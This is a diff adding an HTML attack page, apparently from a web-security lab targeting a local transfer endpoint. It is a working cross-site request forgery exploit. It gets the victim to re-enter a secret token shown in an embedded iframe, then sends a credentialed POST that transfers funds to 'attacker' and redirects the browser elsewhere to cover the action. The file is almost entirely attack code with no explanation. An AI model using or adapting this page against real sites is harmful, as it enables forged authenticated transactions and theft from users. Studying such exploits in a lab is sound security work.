@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<style type="text/css">
+    .iframe {
+        width: 400px;
+        height: 20px;
+    }
+</style>
+</head>
+<body>
+<script>
+    function transfer() {
+        var tokeninput = document.getElementsByName("tokeninput");
+        var value = tokeninput[0].value;
+        var x = new XMLHttpRequest();
+        x.open("POST", "http://127.0.0.1:3000/super_secure_post_transfer");
+        x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        x.withCredentials = true;
+        x.send("destination_username=attacker&quantity=10&tokeninput=" + value);
+        setTimeout("window.location = 'https://www.baidu.com';", 100);
+    }
+</script>
+
+<label>Super Secret Token</label>
+<p><iframe src="bp2.html" class="iframe" frameborder="0" scrolling="no"></iframe></p>
+
+<label for="tokeninput">Enter Secret Token</label>
+<p><input type="text" name="tokeninput" value="" /></p>
+
+<p><input type="submit" value="Transfer" onclick="transfer()"/></p>
+
+</body>
+
+</html>
